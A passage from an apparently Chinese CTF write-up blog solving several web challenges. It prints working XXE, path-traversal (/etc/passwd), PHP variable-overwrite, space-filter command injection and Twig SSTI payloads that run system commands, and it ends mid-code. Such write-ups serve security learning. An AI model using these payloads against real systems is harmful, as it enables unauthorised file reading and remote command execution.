src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2ff73e9f63c038fbb87aa5fdc1686fdc.png"></p><p>在源代码</p><hr><h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">doLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> password <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> password <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Please enter the username and password!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token string">"&lt;user&gt;&lt;username&gt;"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"&lt;/username&gt;&lt;password&gt;"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"&lt;/password&gt;&lt;/user&gt;"</span><span class="token punctuation">;</span>     $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"doLogin.php"</span><span class="token punctuation">,</span>        <span class="token literal-property property">contentType</span><span class="token operator">:</span> <span class="token string">"application/xml;charset=utf-8"</span><span class="token punctuation">,</span>        <span class="token literal-property property">data</span><span class="token operator">:</span> data<span class="token punctuation">,</span>        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"xml"</span><span class="token punctuation">,</span>        <span class="token literal-property property">anysc</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token comment">//这里存在拼写错误，正确的应该是 async: false(哈？)</span>        <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> code <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">;</span>        <span class="token keyword">var</span> msg <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>code <span class="token operator">==</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> <span class="token string">" login fail!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>code <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> <span class="token string">" login success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"error:"</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token function-variable function">error</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">XMLHttpRequest<span class="token punctuation">,</span>textStatus<span class="token punctuation">,</span>errorThrown</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>errorThrown <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> textStatus<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Fake XML cookbook&gt;<a href="https://www.cnblogs.com/backlion/p/9302528.html">XML外部实体（XXE）注入详解 - 渗透测试中心 - 博客园</a></p><p>好长（😓😰</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c85daba0fa2608792507c6814ab6be7d.png"></p><p>username这里可</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span><span class="token punctuation">&gt;</span></span>&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>xaxaxa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag{601aea4d-8dfc-4651-a212-0271dcf90759}</p><hr><h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fc4bfa32f44415f4ef71bc8fa0ac19d6.png"></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">【首发】phpmyadmin4.8.1后台getshell</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/18c2813b1aa6a47d71a1113fd183c5c9.png"></p><p><del>这版本号很难不怀疑是先射箭后画靶（</del></p><pre class="line-numbers language-none"><code class="language-none">?target=db_sql.php%253f/../../../../../../etc/passwd #发现可?target=db_sql.php%253f/../../../../../../flagflag{23e69c98-808e-4a00-9cdb-a5caff9299f6}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>说实话，有点炫酷（</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/892f0ddbef34f3312a4405fbb403b39b.png"></p><p>又是git</p><p>嘶，但是index.php有点损坏，于是从github上拿了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dog"</span><span class="token punctuation">;</span><span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cat"</span><span class="token punctuation">;</span><span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yds'</span><span class="token punctuation">;</span><span class="token comment"># 遍历通过 POST 方法传递过来的所有参数</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=&gt;</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment"># 动态创建或修改变量，将 POST 参数的键作为变量名，值作为变量　　　</span>    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$y</span>  <span class="token punctuation">;</span> <span class="token comment">#x=y=&gt;$x=y</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=&gt;</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>　　　     <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$$y</span><span class="token punctuation">;</span> <span class="token comment">#?x=y=&gt;$x=$y</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=&gt;</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">#$flag=$x;$x!='flag'</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">#存在$flag且一个即可</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"the flag is: "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>exit($flag)</code> 就是将变量 <code>$flag</code> 的值作为参数传递给 <code>exit</code>。</p><p>(1) exit($handsome):</p><p>$x与$flag值相同但$x不是$flag,即要保证 <code>$_GET['flag']</code> 的值等于某个除 <code>'flag'</code> 之外的 GET 参数的键名，只要$flag=$num1&amp;$num1=$anything。而且必须有一个是$x=$handsome,$y=flag以覆盖’yds’（?handsome=flag)。</p><p>so,<code>?handsome=flag&amp;flag=qing&amp;qing=qihai</code></p><p>(2) exit($yds):</p><p>$yds=$flag即可。<code>?yds=flag</code></p><p>(3) exit($is):</p><p>?is=flag而且直接$flag=$flag.<code>?is=flag&amp;flag=flag</code></p><p>(4)echo :</p><p><code>get</code> 传参数的时候，如果传入<code>1</code>，默认:做为键:类型是 <code>int</code>; 做为值，类型是 <code>string</code></p><p><code>$_GET['flag'] === $x</code> : 如果传入 <code>a=flag&amp;flag=anything</code> 那么 判断 <code>a=flag</code> 的时候 <code>$_GET['flag']</code> 是 <code>a</code>, <code>&amp;x</code> 是 <code>a</code>，完全相等 进入if条件, 而如果传入 <code>1=flag&amp;flag=1</code> 那么判断 <code>1=flag</code>的时候 <code>$_GET['flag']</code> 是 <code>(string)1</code> ，<code>&amp;x</code> 是 <code>(int)1</code> 不完全相等，无法进入if条件，进而绕过。</p><p><code>?1=flag&amp;flag=1</code></p><hr><h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><blockquote><p>这个错误信息 <code>Cannot modify header information - headers already sent by (output started at /var/www/html/index.php:3) in /var/www/html/index.php on line 4</code> 是 PHP 中一个常见的错误，它表明你在尝试修改 HTTP 响应头时，响应头已经被发送出去了。</p><p>在 PHP 里，HTTP 响应头必须在任何实际的输出（像 HTML 内容、空格、换行符等）之前发送。一旦有输出产生，PHP 就会自动把响应头发送给客户端，之后再尝试修改响应头就会触发这个错误。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/951c27a59a316c07b87d61cf4e91c280.png"></p><p>看着好像robot(</p><p><del>哈哈果然有，赌狗大胜利（</del></p><p><del>啊啊啊竟然是假的，赌狗大失败</del></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/dc253305a2a22325b0b8957420b71c6d.png"></p><p>！！！又站起来了</p><p>😰什么__图，哈人(尤其是我的还乱码，让我安了个扩展修了一遍)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt; img src="/img.jpg"&gt;<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2020</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">#intval 函数用于获取变量的整数值。</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span><span class="token punctuation">;</span>   <span class="token keyword">else</span>       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">#需不包含空格</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"wctf2020"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#过滤cat</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span>去非洲吧<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>哈哈哈哈哈哈我在B站/抖上经常看这up的视频（</p><blockquote><p>intval ( mixed $var [, int $base = 10 ] ) : int<br>$var：要转换为整数的变量，可以是字符串、浮点数等。<br>$base：转换所使用的进制，默认为十进制（10）。</p><p><code>intval</code> 函数在处理字符串时，会从字符串开头提取有效的数字部分，直到遇到非数字字符为止。</p></blockquote><ol><li><strong><code>$num</code> 的值</strong>：我们将 <code>$num</code> 赋值为 <code>"2019e10"</code>。在科学计数法中，<code>2019e10</code> 表示 <code>2019 * 10^10</code>。</li><li><strong><code>intval($num)</code> 的计算</strong>：当对 <code>"2019e10"</code> 调用 <code>intval</code> 函数时，它会从字符串开头提取数字部分，即只取到 <code>"2019"</code>，所以 <code>intval($num)</code> 的结果是 2019，满足 <code>intval($num) &lt; 2020</code>。</li><li><strong><code>intval($num + 1)</code> 的计算</strong>：在 PHP 中，当一个字符串和一个整数进行加法运算时，会先将字符串尝试转换为数字。<code>"2019e10"</code> 会被转换为科学计数法表示的数值，即 <code>2019 * 10^10</code>，然后加 1 后再调用 <code>intval</code> 函数，由于这个数值远远大于 2021，所以 <code>intval($num + 1) &gt; 2021</code> 成立。</li><li><strong>表达式结果</strong>：由于两个条件都满足，所以整个表达式 <code>intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</code> 的结果为 <code>true</code>。</li></ol><p><a href="https://www.cnblogs.com/dre0m1/p/16062369.html">PHP中MD5和sha1绕过方式总结 - dre0m1 - 博客园</a></p><p><code>0e215962017</code> 的 MD5 值也是由 <strong>0e</strong> 开头，在 PHP 弱类型比较中相等</p><blockquote><p><code>strstr</code> 函数用于查找字符串在另一个字符串中首次出现的位置，并返回从该位置到字符串末尾的部分。如果未找到，则返回 <code>false</code>。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token keyword type-hint">mixed</span> <span class="token variable">$search</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$subject</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$count</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>$search</code>：要查找并替换的字符串或数组。</li><li><code>$replace</code>：用于替换 <code>$search</code> 的字符串或数组。</li><li><code>$subject</code>：要在其中进行替换操作的字符串或数组。</li><li><code>$count</code>：可选参数，用于记录替换发生的次数。</li></ul></blockquote><p><code>ls</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0eb6cd922ba7eee36797439d7ecdbb3d.png"></p><p><del>吓死了第一眼还以为flag是个图片</del></p><pre class="line-numbers language-none"><code class="language-none">?num=2019e10&amp;md5=0e215962017&amp;get_flag=tail$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaagflag{792fd7de-6906-4c7c-8fab-a153c66377d3}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>​<!-- Why not take a closer look at cookies? --></p><p><a href="https://cloud.tencent.com/developer/article/2130787">一文了解SSTI和所有常见payload 以flask模板为例-腾讯云开发者社区-腾讯云</a></p><p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20250218130008075.png" alt="image-20250218130008075"></p><p>另：<code>{{7*'7'}}</code>在Twig中返回<code>49</code>，在Jinja2中返回<code>77777777</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8fd1c993d8b96fabcaa7767f11ff1745.png"></p><ul><li></li></ul><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fe001932fec08dee373fa155f9db9668.png"></p><p>意思是这个BJDCTF考了两遍Twig，<del>what can I say(</del></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2311f4524bead78403c2d186c4d84c36.png"></p><p>xaxaxa</p><pre class="line-numbers language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("ls /")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8e7ad35e42e2f858784f923c139bf41c.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/afd1a322d76d2ad1ed3f2d3006f2d31b.png"></p><hr><h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p><a href="https://segmentfault.com/a/1190000007250604">PHP之十六个魔术方法详解 - The code - SegmentFault 思否网</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php<span class="token comment">//flag is in flag.php</span><span class="token comment">//WTF IS THIS?</span><span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//目标</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//__invoke方法会在对象被当作函数调用时触发</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">append</span><span 